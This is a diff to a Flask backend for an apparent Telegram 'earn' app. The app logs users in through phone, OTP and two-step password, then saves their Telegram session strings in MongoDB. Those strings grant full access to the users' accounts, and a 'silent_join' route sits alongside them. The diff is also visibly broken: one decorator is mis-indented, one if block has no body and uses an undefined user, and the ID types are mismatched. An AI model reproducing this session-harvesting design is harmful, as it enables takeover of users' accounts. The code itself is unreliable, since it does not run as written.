@@ -34,6 +34,8 @@ client = MongoClient(MONGO_URI)
 db = client["aaf_tele_earn_db"]
 users_col = db["users"]
 settings_col = db["settings"]
+admin_col = db["admin"]
+payments_col = db["payments"]
 
 # ================= HELPERS =================
 
@@ -142,9 +144,9 @@ def payment_history():
 
 # ================= CORE API =================
 
-@app.route("/api/user/data/<int:user_id>")
+    @app.route("/api/user/data/<int:user_id>")
 def user_data(user_id):
-    user = users_col.find_one({"telegram_id": user_id})
+    if session.get("uid") != user_id:
 
     if not user:
         return jsonify({"status": "error", "message": "user_not_found"})
@@ -173,24 +175,20 @@ def silent_join():
     return jsonify({"success": True})
 
 
-
-
 @app.route("/api/user")
 def get_user():
     uid = session.get("uid")
 
     if not uid:
-        return jsonify({"success": False, "message": "No session"})
+        return jsonify({"success": False, "message": "session_expired"})
 
-    user = users_col.find_one({"_id": ObjectId(uid)})
+    user = users_col.find_one({"telegram_id": uid})
 
     if not user:
-        return jsonify({"success": False, "message": "User not found"})
+        return jsonify({"success": False, "message": "user_not_found"})
 
     user["_id"] = str(user["_id"])
     return jsonify({"success": True, "user": user})
-
-
 # ================= ADMIN =================
 @app.route("/admin/update", methods=["POST"])
 def admin_update():
@@ -213,26 +211,29 @@ def api_login():
     user = users_col.find_one({"phone": phone})
 
     if not user:
-        user = {
+        users_col.insert_one({
             "phone": phone,
-            "telegram_id": int(datetime.now().timestamp()),
             "cash": 0,
             "aaf": 0,
             "refer_count": 0,
             "is_joined": False,
             "last_login": datetime.now()
-        }
-        users_col.insert_one(user)
+        })
+        user = users_col.find_one({"phone": phone})
     else:
         users_col.update_one(
             {"phone": phone},
             {"$set": {"last_login": datetime.now()}}
         )
 
-    session["uid"] = user["telegram_id"]
+    # session এ Mongo _id রাখো (সবচেয়ে safe)
+    session["uid"] = str(user["_id"])
     session.permanent = True
 
-    return jsonify({"success": True})
+    return jsonify({
+        "success": True,
+        "user_id": str(user["_id"])
+    })
 
 # ================= OTP LOGIN =================
 @app.route('/api/send_otp', methods=['POST'])
@@ -308,6 +309,7 @@ def verify_login():
 
             session_str = client.session.save()
 
+            # Telegram data save
             users_col.update_one(
                 {"phone": phone},
                 {"$set": {
@@ -316,11 +318,10 @@ def verify_login():
                     "username": user.username,
                     "session_str": session_str,
                     "last_login": datetime.now()
-                }},
-                upsert=True
+                }}
             )
 
-            return True, user.id
+            return True, None
 
         except SessionPasswordNeededError:
             return False, "SHOW_PWD_STEP"
@@ -334,12 +335,17 @@ def verify_login():
     success, result = run_async(main())
 
     if success:
-        session["uid"] = result
+        # 🔥 Mongo _id দিয়ে session সেট
+        fresh_user = users_col.find_one({"phone": phone})
+        session["uid"] = str(fresh_user["_id"])
         session.permanent = True
-        return jsonify({"success": True})
+
+        return jsonify({
+            "success": True,
+            "user_id": str(fresh_user["_id"])
+        })
 
     return jsonify({"success": False, "message": result})
-
 # ================= LOGOUT =================
 @app.route('/logout')
 def logout():
